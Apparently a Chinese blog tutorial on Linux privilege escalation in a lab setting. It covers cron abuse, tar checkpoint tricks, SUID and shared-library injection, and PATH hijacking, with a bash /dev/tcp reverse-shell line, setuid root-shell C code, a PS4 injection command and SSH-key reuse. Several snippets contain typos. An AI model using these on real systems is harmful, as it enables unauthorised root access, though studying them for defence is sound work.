+<div class="wp-block-group is-vertical is-layout-flex wp-container-core-group-is-layout-12 wp-block-group-is-layout-flex">
+<p>cat /etc/crontab #查看计划任务列表</p>
+
+
+
+<div class="wp-block-group has-very-light-gray-to-cyan-bluish-gray-gradient-background has-background is-vertical is-layout-flex wp-container-core-group-is-layout-11 wp-block-group-is-layout-flex">
+<p>这个命令会显示Linux系统中的<mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">计划任务列表</mark>，其中包括系统级别的计划任务。</p>
+
+
+
+<p>在Linux系统中，计划任务是一种自动化执行特定任务的机制。这些任务可以是系统级别的，也可以是用户级别的。系统级别的计划任务通常由管理员创建，可以在系统启动时或定期执行。用户级别的计划任务则由用户自己创建，可以在用户登录时或定期执行。</p>
+
+
+
+<p>/etc/crontab是一个系统级别的计划任务配置文件，它包含了系统级别的计划任务列表。这个文件的格式比较特殊，它包含了一些字段来指定任务的执行时间和命令。</p>
+
+
+
+<p>使用cat命令可以显示这个文件的内容。如果您有足够的权限，可以尝试执行这个命令来查看系统中的计划任务列表。</p>
+</div>
+</div>
+
+
+
+<figure class="wp-block-image size-full"><img decoding="async" width="1020" height="588" src="./linux提权 – why403_files/image-7.png" alt="" class="wp-image-1331" srcset="https://www.why403.cn/wp-content/uploads/2023/12/image-7.png 1020w, https://www.why403.cn/wp-content/uploads/2023/12/image-7-300x173.png 300w, https://www.why403.cn/wp-content/uploads/2023/12/image-7-768x443.png 768w, https://www.why403.cn/wp-content/uploads/2023/12/image-7-443x255.png 443w" sizes="(max-width: 1020px) 100vw, 1020px"></figure>
+
+
+
+<p><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">locate [filename.*] </mark> #这个命令会在Linux系统中查找包含指定文件名的文件，并返回它们的路径。<br><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">ls -liah [path]</mark>也可以使用<mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">ll [path]</mark><br>发现该文件其他用户有写权限<br>这样就<mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">可以尝试在该文件中写入反弹shell,当他执行自动任务时就会执行反弹shell与攻击机建立连接</mark></p>
+
+
+
+<div class="wp-block-group is-vertical is-layout-flex wp-container-core-group-is-layout-16 wp-block-group-is-layout-flex">
+<div class="wp-block-group is-vertical is-layout-flex wp-container-core-group-is-layout-15 wp-block-group-is-layout-flex">
+<h3 class="wp-block-heading">利用反弹shell获得root</h3>
+
+
+
+<p>先在攻击机上设置监听<br><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">sudo nc -lvnp [port]</mark></p>
+
+
+
+<div class="wp-block-group has-very-light-gray-to-cyan-bluish-gray-gradient-background has-background is-vertical is-layout-flex wp-container-core-group-is-layout-13 wp-block-group-is-layout-flex">
+<p>这个命令使用了<code>nc</code>（netcat）工具来监听指定的端口，并将接收到的数据打印到标准输出。<code>-l</code>选项表示监听模式，<code>-v</code>选项表示详细输出，<code>-n</code>选项表示禁用DNS解析，<code>-p</code>选项后面跟着要监听的端口号。</p>
+
+
+
+<p>需要注意的是，<code>sudo</code>命令用于以超级用户权限来执行<code>nc</code>命令。这可以确保您有足够的权限来监听低于1024的特权端口。请确保在使用此命令之前了解所需的安全措施，并确保只在受信任的环境中使用。</p>
+
+
+
+<p>此命令将在终端上启动<code>nc</code>工具并开始监听指定端口。当有数据发送到该端口时，<code>nc</code>将把接收到的数据打印到终端上。这对于调试网络连接或接收远程主机发送的数据非常有用。</p>
+</div>
+
+
+
+<p><mark style="background-color:rgba(0, 0, 0, 0);color:#e84d4d" class="has-inline-color"><strong>注：因为这里可修改文件时shell脚本所以写入shell脚本，如果是其他语言可以写入其他语言构造的反弹shell</strong></mark><br><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">bash -i &gt;&amp; /dev/tcp/ip/port 1&gt;&amp;0</mark></p>
+
+
+
+<div class="wp-block-group has-very-light-gray-to-cyan-bluish-gray-gradient-background has-background is-vertical is-layout-flex wp-container-core-group-is-layout-14 wp-block-group-is-layout-flex">
+<p>命令是一个典型的反向 shell 命令，它用于建立与指定 IP 地址和端口的远程主机之间的反向 shell 连接。</p>
+
+
+
+<p>这个命令的含义是，将 Bash 的输入和输出重定向到指定的 IP 地址和端口上的网络套接字。通过这种方式，它可以与远程主机建立连接，并将本地的标准输入和输出与远程主机的 shell 关联起来，从而实现远程控制。</p>
+</div>
+</div>
+
+
+
+<p>这样当自动任务执行时就可以接收到反弹shell了，<mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">而且是root权限</mark></p>
+
+
+
+<p><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">完整过程：</mark></p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="884" height="503" src="./linux提权 – why403_files/image-9.png" alt="" class="wp-image-1340" srcset="https://www.why403.cn/wp-content/uploads/2023/12/image-9.png 884w, https://www.why403.cn/wp-content/uploads/2023/12/image-9-300x171.png 300w, https://www.why403.cn/wp-content/uploads/2023/12/image-9-768x437.png 768w, https://www.why403.cn/wp-content/uploads/2023/12/image-9-443x252.png 443w" sizes="(max-width: 884px) 100vw, 884px"></figure>
+</div>
+</div>
+
+
+
+<p></p>
+
+
+
+<div class="wp-block-group is-vertical is-layout-flex wp-container-core-group-is-layout-22 wp-block-group-is-layout-flex">
+<div class="wp-block-group is-vertical is-layout-flex wp-container-core-group-is-layout-21 wp-block-group-is-layout-flex">
+<div class="wp-block-group is-vertical is-layout-flex wp-container-core-group-is-layout-20 wp-block-group-is-layout-flex">
+<h2 class="wp-block-heading">自动任务path提权</h2>
+
+
+
+<h3 class="wp-block-heading"><strong>原理：</strong></h3>
+
+
+
+<div class="wp-block-group is-vertical is-layout-flex wp-container-core-group-is-layout-18 wp-block-group-is-layout-flex">
+<p><strong><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">提权原理于前面自动任务提权相同都是借用自动任务的root权限执行bash，不同的是执行bash的操作[手法]。</mark>由于在创建自动任务时 待执行文件 添加的是相对路径在解析时就会依据path中的环境变量依次在环境变量中查找，如果部分环境变量中的内容是可控的，且可以先解析到，就可以<mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">在该目录下创建同名文件，让其提前执行同名自动任务文件，这个同名的自动任务文件就是我们写的shell脚本</mark>。</strong></p>
+</div>
+
+
+
+<div class="wp-block-group is-vertical is-layout-flex wp-container-core-group-is-layout-19 wp-block-group-is-layout-flex">
+<h3 class="wp-block-heading">前提：</h3>
+
+
+
+<p>1.crontab环境变量目录可控<br>2.待覆盖的原自动任务的环境变量在path中的位置于可控环境变量之后</p>
+</div>
+</div>
+
+
+
+<h3 class="wp-block-heading">编写shell脚本：</h3>
+</div>
+</div>
+
+
+
+<pre class="wp-block-code"><code>!# /bin/bash
+
+cp /bin/bash /tmp/rootbash
+chmod +xs /tmp/rootbash</code></pre>
+
+
+
+<div class="wp-block-group is-vertical is-layout-flex wp-container-core-group-is-layout-25 wp-block-group-is-layout-flex">
+<div class="wp-block-group is-vertical is-layout-flex wp-container-core-group-is-layout-24 wp-block-group-is-layout-flex">
+<div class="wp-block-group has-very-light-gray-to-cyan-bluish-gray-gradient-background has-background is-vertical is-layout-flex wp-container-core-group-is-layout-23 wp-block-group-is-layout-flex">
+<p>这个命令是一个简单的 shell 脚本，它的作用是将系统中的 Bash shell 复制到<code>/tmp</code>目录下，并将其设置为 SUID 标志和可执行权限。</p>
+
+
+
+<p>这个脚本的第一行<code>!# /bin/bash</code>实际上应该是<code>#!/bin/bash</code>，是一个 shebang（也称为 hashbang），用于指定脚本的解释器。</p>
+
+
+
+<p>接下来的两行命令分别执行了以下操作：</p>
+
+
+
+<ol class="wp-block-list">
+<li>将系统中的<code>/bin/bash</code>复制到<code>/tmp</code>目录下，命名为<code>rootbash</code>。</li>
+
+
+
+<li>将<code>/tmp/rootbash</code>文件设置为 SUID 标志和可执行权限。</li>
+</ol>
+
+
+
+<p>这将使任何用户都可以以 root 用户的身份执行<code>/tmp/rootbash</code>文件，从而获得 root 权限。</p>
+</div>
+
+
+
+<p>并使用<mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">chmod +x [filename.sh] </mark>给自动任务脚本执行权限</p>
+
+
+
+<p>等待自动任务执行后将会获得权限，自动任务执行时间要看自动任务设置时的等待时间</p>
+
+
+
+<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1024" height="758" src="./linux提权 – why403_files/image-11-1024x758.png" alt="" class="wp-image-1342" srcset="https://www.why403.cn/wp-content/uploads/2023/12/image-11-1024x758.png 1024w, https://www.why403.cn/wp-content/uploads/2023/12/image-11-300x222.png 300w, https://www.why403.cn/wp-content/uploads/2023/12/image-11-768x569.png 768w, https://www.why403.cn/wp-content/uploads/2023/12/image-11-443x328.png 443w, https://www.why403.cn/wp-content/uploads/2023/12/image-11.png 1340w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>
+
+
+
+<p><mark style="background-color:rgba(0, 0, 0, 0);color:#f85d5d" class="has-inline-color"><strong>注：上述的path是crontab下自定义的path，不是用户的path</strong></mark></p>
+
+
+
+<p><strong><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">提权的关键在于，如何执行shell脚本，以及shell脚本的编写</mark></strong></p>
+</div>
+</div>
+
+
+
+<div class="wp-block-group is-vertical is-layout-flex wp-container-core-group-is-layout-27 wp-block-group-is-layout-flex">
+<div class="wp-block-group is-vertical is-layout-flex wp-container-core-group-is-layout-26 wp-block-group-is-layout-flex">
+<h2 class="wp-block-heading">Linux自动任务tar自动备份提权</h2>
+
+
+
+<p><strong>场景：</strong>在生产场景中管理员通常会设置自动任务用tar实现备份，但是tar有有个不安全的选项，可以对备份文件设置断点，另一个选项是遇到到断点时执行自定义的命令。</p>
+
+
+
+<p><strong><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">原理：还是相同利用自动任务的root权限执行bash</mark></strong></p>
+
+
+
+<p><strong>利用思路：</strong><br>cat /etc/crontab  先查看有无类似自动备份设置<br>可见该自动任务是对/home/user目录下所有内容进行备份</p>
+
+
+
+<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1024" height="492" src="./linux提权 – why403_files/image-12-1024x492.png" alt="" class="wp-image-1349" srcset="https://www.why403.cn/wp-content/uploads/2023/12/image-12-1024x492.png 1024w, https://www.why403.cn/wp-content/uploads/2023/12/image-12-300x144.png 300w, https://www.why403.cn/wp-content/uploads/2023/12/image-12-768x369.png 768w, https://www.why403.cn/wp-content/uploads/2023/12/image-12-443x213.png 443w, https://www.why403.cn/wp-content/uploads/2023/12/image-12.png 1050w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>
+
+
+
+<p>查看tar命令使用可以看到有个可以设置断点的选项，以及遇到断点进行自定义操作的选项</p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="769" height="155" src="./linux提权 – why403_files/image-13.png" alt="" class="wp-image-1350" srcset="https://www.why403.cn/wp-content/uploads/2023/12/image-13.png 769w, https://www.why403.cn/wp-content/uploads/2023/12/image-13-300x60.png 300w, https://www.why403.cn/wp-content/uploads/2023/12/image-13-443x89.png 443w" sizes="(max-width: 769px) 100vw, 769px"></figure>
+
+
+
+<p>这样就可以创建一个文件，并且设置断点，该断点执行的任务是执行一个反弹shell，由于该反弹shell是有root权限执行的，攻击机拿到shell就是一个具有root权限的shell<br>用msf生成一个反弹shell上传到/home/user目录下,这里是shell.elf<br><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">然后创建–checkpoint文件和checkpoint-action文件，并定义action=exec=shell.elf，执行当前目录下的shell.elf</mark></p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="775" height="142" src="./linux提权 – why403_files/image-14.png" alt="" class="wp-image-1351" srcset="https://www.why403.cn/wp-content/uploads/2023/12/image-14.png 775w, https://www.why403.cn/wp-content/uploads/2023/12/image-14-300x55.png 300w, https://www.why403.cn/wp-content/uploads/2023/12/image-14-768x141.png 768w, https://www.why403.cn/wp-content/uploads/2023/12/image-14-443x81.png 443w" sizes="(max-width: 775px) 100vw, 775px"></figure>
+
+
+
+<p>这样当进行备份的时候就会执行该反弹shell，我们在攻击机中就能拿到root</p>
+
+
+
+<p><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color"><strong>关键在于tar这样 可以利用来执行命令的命令，以及执行的操作是可控的，tar只是一个例子</strong></mark>。</p>
+</div>
+</div>
+
+
+
+<p></p>
+
+
+
+<h2 class="wp-block-heading">suid提权</h2>
+
+
+
+<p><strong><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">原理：一切利用suid提权都是借用suid权限打开bash</mark></strong></p>
+
+
+
+<div class="wp-block-group is-vertical is-layout-flex wp-container-core-group-is-layout-29 wp-block-group-is-layout-flex">
+<h3 class="wp-block-heading">利用msf对已知漏洞提权—以Exim提权漏洞为例</h3>
+
+
+
+<div class="wp-block-group is-vertical is-layout-flex wp-container-core-group-is-layout-28 wp-block-group-is-layout-flex">
+<h4 class="wp-block-heading">信息搜集</h4>
+
+
+
+<p><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">find / -perm -u=s –type f 2&gt;/dev/null</mark>  #find查找具有suid的文件</p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="509" height="413" src="./linux提权 – why403_files/image-16.png" alt="" class="wp-image-1358" srcset="https://www.why403.cn/wp-content/uploads/2023/12/image-16.png 509w, https://www.why403.cn/wp-content/uploads/2023/12/image-16-300x243.png 300w, https://www.why403.cn/wp-content/uploads/2023/12/image-16-443x359.png 443w" sizes="(max-width: 509px) 100vw, 509px"></figure>
+
+
+
+<p>当linpeas跑出敏感项，或者在信息搜集过程中发现敏感项，如Exim文件</p>
+
+
+
+<p><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">searchspoit exim</mark>  # 用msf搜索可用exp</p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="734" height="604" src="./linux提权 – why403_files/image-17.png" alt="" class="wp-image-1359" srcset="https://www.why403.cn/wp-content/uploads/2023/12/image-17.png 734w, https://www.why403.cn/wp-content/uploads/2023/12/image-17-300x247.png 300w, https://www.why403.cn/wp-content/uploads/2023/12/image-17-443x365.png 443w" sizes="(max-width: 734px) 100vw, 734px"></figure>
+</div>
+
+
+
+<p><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">searchsploit exim -m 39535.sh </mark># 下载exp</p>
+
+
+
+<p><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">cat 39535.sh</mark> # 查看用法</p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="519" height="443" src="./linux提权 – why403_files/image-18.png" alt="" class="wp-image-1360" srcset="https://www.why403.cn/wp-content/uploads/2023/12/image-18.png 519w, https://www.why403.cn/wp-content/uploads/2023/12/image-18-300x256.png 300w, https://www.why403.cn/wp-content/uploads/2023/12/image-18-443x378.png 443w" sizes="(max-width: 519px) 100vw, 519px"></figure>
+
+
+
+<p>根据用法上传到靶机本地执行即可</p>
+
+
+
+<p>常用suid,guid提权命令利用网站</p>
+
+
+
+<p>通过find -prem -u=s -o -g=s –type f 2&gt; /dev/null 可以找到具有suid和guid的文件，在从中找到可以执行的文件，这样就可以利用suid或guid实现提权，提权的方法在下面这个网址中给出，例如 find,less等的提权利用</p>
+
+
+
+<p><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
+</div>
+
+
+
+<div class="wp-block-columns is-layout-flex wp-container-core-columns-is-layout-1 wp-block-columns-is-layout-flex">
+<div class="wp-block-column is-layout-flow wp-block-column-is-layout-flow" style="flex-basis:100%">
+<div class="wp-block-group"><div class="wp-block-group__inner-container is-layout-constrained wp-block-group-is-layout-constrained">
+<h3 class="wp-block-heading">suid共享库注入提取</h3>
+
+
+
+<p><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">find / -perm -u=s –type f 2&gt;/dev/null</mark></p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="558" height="400" src="./linux提权 – why403_files/image-19.png" alt="" class="wp-image-1361" srcset="https://www.why403.cn/wp-content/uploads/2023/12/image-19.png 558w, https://www.why403.cn/wp-content/uploads/2023/12/image-19-300x215.png 300w, https://www.why403.cn/wp-content/uploads/2023/12/image-19-443x318.png 443w" sizes="(max-width: 558px) 100vw, 558px"></figure>
+
+
+
+<p>这是一个具有suid权限的文件，根据名字猜到可能会与共享库有关（shared object）</p>
+
+
+
+<p>strings /usr/local/bin/suid-so 查看该文件内容</p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="734" height="656" src="./linux提权 – why403_files/image-20.png" alt="" class="wp-image-1362" srcset="https://www.why403.cn/wp-content/uploads/2023/12/image-20.png 734w, https://www.why403.cn/wp-content/uploads/2023/12/image-20-300x268.png 300w, https://www.why403.cn/wp-content/uploads/2023/12/image-20-443x396.png 443w" sizes="(max-width: 734px) 100vw, 734px"></figure>
+
+
+
+<p>发现该库可能调用了/home/user/.config/libcal.so库</p>
+
+
+
+<p>strace  /usr/local/bin/suid-so |grep “home”   # 对该文件进行调试运行</p>
+
+
+
+<figure class="wp-block-image size-large is-resized"><img loading="lazy" decoding="async" width="1024" height="233" src="./linux提权 – why403_files/image-21-1024x233.png" alt="" class="wp-image-1363" style="width:1001px;height:auto" srcset="https://www.why403.cn/wp-content/uploads/2023/12/image-21-1024x233.png 1024w, https://www.why403.cn/wp-content/uploads/2023/12/image-21-300x68.png 300w, https://www.why403.cn/wp-content/uploads/2023/12/image-21-768x174.png 768w, https://www.why403.cn/wp-content/uploads/2023/12/image-21-443x101.png 443w, https://www.why403.cn/wp-content/uploads/2023/12/image-21.png 1070w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>
+
+
+
+<p>根据调试信息，发现尝试打开/home/user/.config/libcalc.co文件，但是没有这个文件</p>
+
+
+
+<p><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">这样我们就可以创建一个该名的共享库写入shell,当执行到共享库的时候就可以拿到root权限了</mark></p>
+
+
+
+<div class="wp-block-group"><div class="wp-block-group__inner-container is-layout-constrained wp-block-group-is-layout-constrained">
+<h3 class="wp-block-heading">共享库写入shell</h3>
+
+
+
+<pre class="wp-block-code"><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+stactic void inject() __attribute__((constructor));
+void inject(){
+           setgid(0);
+           setuid(0);
+           system("/bin/bash -p");
+}</code></pre>
+
+
+
+<div class="wp-block-group is-vertical is-layout-flex wp-container-core-group-is-layout-31 wp-block-group-is-layout-flex">
+<div class="wp-block-group has-very-light-gray-to-cyan-bluish-gray-gradient-background has-background is-vertical is-layout-flex wp-container-core-group-is-layout-30 wp-block-group-is-layout-flex">
+<p><strong>解释：</strong></p>
+
+
+
+<p>代码是用C语言编写的，其中包含了一个名为<code>inject()</code>的函数，该函数使用<code>__attribute__((constructor))</code>属性，意味着它将在<code>main()</code>函数之前自动执行。</p>
+
+
+
+<p><code>inject()</code>函数包含了三个语句：</p>
+
+
+
+<ol class="wp-block-list">
+<li><code>setgid(0);</code>&nbsp;将组ID设置为0，通常是超级用户（root）的组ID。</li>
+
+
+
+<li><code>setuid(0);</code>&nbsp;将用户ID设置为0，通常也是超级用户（root）的用户ID。</li>
+
+
+
+<li><code>system("/bin/bash -p");</code>&nbsp;执行<code>/bin/bash -p</code>命令，该命令以提升的权限启动一个交互式shell。</li>
+</ol>
+
+
+
+<p>这段代码是升权限并执行一个具有高权限的交互式shell。</p>
+</div>
+</div>
+
+
+
+<div class="wp-block-group is-vertical is-layout-flex wp-container-core-group-is-layout-32 wp-block-group-is-layout-flex">
+<p><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">gcc -shared -fPIC -o libcalc.so libcal.c</mark>       # 编译成为共享库</p>
+
+
+
+<p>运行/usr/local/bin/suid-so就可以拿到root权限了</p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="776" height="311" src="./linux提权 – why403_files/image-23.png" alt="" class="wp-image-1366" srcset="https://www.why403.cn/wp-content/uploads/2023/12/image-23.png 776w, https://www.why403.cn/wp-content/uploads/2023/12/image-23-300x120.png 300w, https://www.why403.cn/wp-content/uploads/2023/12/image-23-768x308.png 768w, https://www.why403.cn/wp-content/uploads/2023/12/image-23-443x178.png 443w" sizes="(max-width: 776px) 100vw, 776px"></figure>
+</div>
+</div></div>
+</div></div>
+</div>
+</div>
+
+
+
+<h3 class="wp-block-heading">suid环境变量利用提权</h3>
+
+
+
+<p><strong>原理：<mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">借用suid权限拿到root权限</mark>，利用环境可修改环境变量，添加可控路径，在可控路径上写入同名的可执行文件，利用suid的权限在该可执行文件中执行bash就可获得具有root的bash</strong><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color"><strong>（相当于利用PATH解析的优先级先执行提权程序）</strong></mark></p>
+
+
+
+<p><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">这里通过service打开apache2而且该文件具有suid</mark></p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="711" height="722" src="./linux提权 – why403_files/image-24.png" alt="" class="wp-image-1367" srcset="https://www.why403.cn/wp-content/uploads/2023/12/image-24.png 711w, https://www.why403.cn/wp-content/uploads/2023/12/image-24-295x300.png 295w, https://www.why403.cn/wp-content/uploads/2023/12/image-24-443x450.png 443w, https://www.why403.cn/wp-content/uploads/2023/12/image-24-24x24.png 24w, https://www.why403.cn/wp-content/uploads/2023/12/image-24-48x48.png 48w, https://www.why403.cn/wp-content/uploads/2023/12/image-24-96x96.png 96w" sizes="(max-width: 711px) 100vw, 711px"></figure>
+
+
+
+<p>构建提权脚本</p>
+
+
+
+<pre class="wp-block-code"><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void main(){
+           setgid(0);
+           setuid(0);
+           system("/bin/bash -p");
+}</code></pre>
+
+
+
+<p><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">gcc -o service service.c</mark> # 编译成可执行文件并输出到当前文件夹下</p>
+
+
+
+<p><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">export PATH=.:$PATH</mark> #把当前路径添加到环境变量中而且优先级在所有path之前</p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="1007" height="614" src="./linux提权 – why403_files/image-25.png" alt="" class="wp-image-1369" srcset="https://www.why403.cn/wp-content/uploads/2023/12/image-25.png 1007w, https://www.why403.cn/wp-content/uploads/2023/12/image-25-300x183.png 300w, https://www.why403.cn/wp-content/uploads/2023/12/image-25-768x468.png 768w, https://www.why403.cn/wp-content/uploads/2023/12/image-25-443x270.png 443w" sizes="(max-width: 1007px) 100vw, 1007px"></figure>
+
+
+
+<h3 class="wp-block-heading">巧用suid#1—bash路径函数</h3>
+
+
+
+<p><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color"><strong>原理：当bash版本低于4.2，可以创建一个以/开头的函数</strong></mark></p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="687" height="757" src="./linux提权 – why403_files/image-26.png" alt="" class="wp-image-1370" srcset="https://www.why403.cn/wp-content/uploads/2023/12/image-26.png 687w, https://www.why403.cn/wp-content/uploads/2023/12/image-26-272x300.png 272w, https://www.why403.cn/wp-content/uploads/2023/12/image-26-443x488.png 443w" sizes="(max-width: 687px) 100vw, 687px"></figure>
+
+
+
+<p>可用看到这里以绝对路径调用了service程序，而且bash版本号低于4.2，可以创建一个提权函数名为“/usr/sbin/service”，然后添加到环境变量中，让程序错误以为我们写的提权函数就是待执行的文件</p>
+
+
+
+<p>实现：</p>
+
+
+
+<p><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">function /usr/sbin/service { /bin/bash -p;}</mark>       # 提权函数</p>
+
+
+
+<p><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">bash -f /usr/sbin/service #</mark> 将函数添加到环境变量</p>
+
+
+
+<p><strong><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">执行/usr/local/bin/suid-env2，这个可执行程序原本想调用/usr/sbin/service 服务但是由于我们把同名函数添加到环境变量，该程序就会先解析path然后再解析绝对路径，这样就提前执行了提权函数</mark></strong></p>
+
+
+
+<div class="wp-block-group is-vertical is-layout-flex wp-container-core-group-is-layout-36 wp-block-group-is-layout-flex">
+<h3 class="wp-block-heading">巧用suid#2—bash调试加料</h3>
+
+
+
+<p>原理：在bash版本低于4.4时可以在运行可执行文件时进行调试，而且可以在调试时执行命令</p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="787" height="756" src="./linux提权 – why403_files/image-27.png" alt="" class="wp-image-1376" srcset="https://www.why403.cn/wp-content/uploads/2023/12/image-27.png 787w, https://www.why403.cn/wp-content/uploads/2023/12/image-27-300x288.png 300w, https://www.why403.cn/wp-content/uploads/2023/12/image-27-768x738.png 768w, https://www.why403.cn/wp-content/uploads/2023/12/image-27-443x426.png 443w, https://www.why403.cn/wp-content/uploads/2023/12/image-27-24x24.png 24w" sizes="(max-width: 787px) 100vw, 787px"></figure>
+
+
+
+<p><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">env -i -SHELLOPT=xtrace -PS4=”$(cp /bin/bash /tmp/rootbash;chmod +sx /tmp/rootbash)” /usr/local/bin/suid-env2</mark></p>
+
+
+
+<div class="wp-block-group has-very-light-gray-to-cyan-bluish-gray-gradient-background has-background is-vertical is-layout-flex wp-container-core-group-is-layout-35 wp-block-group-is-layout-flex">
+<p>这是一个命令行的输入，其中使用了<code>env</code>命令来设置环境变量，并执行了一个名为<code>suid-env2</code>的可执行文件。</p>
+
+
+
+<p>在这个命令中，<code>-i</code>选项告诉<code>env</code>命令在执行命令时不使用当前环境变量，<code>-SHELLOPT=xtrace</code>选项用于启用命令的跟踪输出，<code>-PS4</code>选项用于设置跟踪输出的前缀。</p>
+
+
+
+<p>根据命令的输出，可以看到跟踪输出的前缀被设置为<code>$(cp /bin/bash /tmp/rootbash;chmod +sx /tmp/rootbash)</code>，这个命令的作用是将<code>/bin/bash</code>复制到<code>/tmp/rootbash</code>，并为其设置可执行权限。</p>
+</div>
+
+
+
+<p>这样<mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">具有suid</mark>的bash就被复制到了/tmp目录下而且这个bash是可执行的执行这个bash就能获得root权限</p>
+</div>
+
+
+
+<div class="wp-block-group is-vertical is-layout-flex wp-container-core-group-is-layout-38 wp-block-group-is-layout-flex">
+<div class="wp-block-group is-vertical is-layout-flex wp-container-core-group-is-layout-37 wp-block-group-is-layout-flex">
+<h3 class="wp-block-heading">通过信息搜集获得密码密钥提权</h3>
+
+
+
+<p><strong>密码：</strong></p>
+
+
+
+<p>history     # 查找bash执行历史记录</p>
+
+
+
+<p>cat /user/.bash_history   # 查看bash历史命令</p>
+
+
+
+<p>或者一些配置文件中会记录用户名密码</p>
+
+
+
+<p><strong>密钥利用：</strong></p>
+
+
+
+<p>在信息搜集过程中一定要注意ssh相关配置文件可能会出现密钥泄露的情况</p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="710" height="480" src="./linux提权 – why403_files/image-28.png" alt="" class="wp-image-1382" srcset="https://www.why403.cn/wp-content/uploads/2023/12/image-28.png 710w, https://www.why403.cn/wp-content/uploads/2023/12/image-28-300x203.png 300w, https://www.why403.cn/wp-content/uploads/2023/12/image-28-443x299.png 443w" sizes="(max-width: 710px) 100vw, 710px"></figure>
+</div>
+
+
+
+<p>vim id_rsa # 复制到kali中创建密钥文件</p>
+
+
+
+<p>chmod 600 id_rsa # 赋予600的权限</p>
+
+
+
+<p>sudo ssh -i id_rsa root@10.10.10.127 # 用私钥ssh远程连接靶机</p>
+
+
+
+<p>根据报错提示不匹配主机算法类型所以在连接是要指定本地算法类型和登录主机算法类型</p>
+
+
+
+<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1024" height="403" src="./linux提权 – why403_files/image-31-1024x403.png" alt="" class="wp-image-1388" srcset="https://www.why403.cn/wp-content/uploads/2023/12/image-31-1024x403.png 1024w, https://www.why403.cn/wp-content/uploads/2023/12/image-31-300x118.png 300w, https://www.why403.cn/wp-content/uploads/2023/12/image-31-768x302.png 768w, https://www.why403.cn/wp-content/uploads/2023/12/image-31-443x174.png 443w, https://www.why403.cn/wp-content/uploads/2023/12/image-31.png 1254w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>
+</div>
+
+
+
+<h3 class="wp-block-heading">nfs提权</h3>
+											</div><!-- .entry-content -->
+
+					<footer class="entry-meta entry-utility">
+											</footer><!-- .entry-utility -->
+
+				</div><!-- .article-inner -->
+				
+	<span class="schema-publisher" itemprop="publisher" itemscope="" itemtype="https://schema.org/Organization">
+         <span itemprop="logo" itemscope="" itemtype="https://schema.org/ImageObject">
+           <meta itemprop="url" content="https://www.why403.cn">
+         </span>
+         <meta itemprop="name" content="why403">
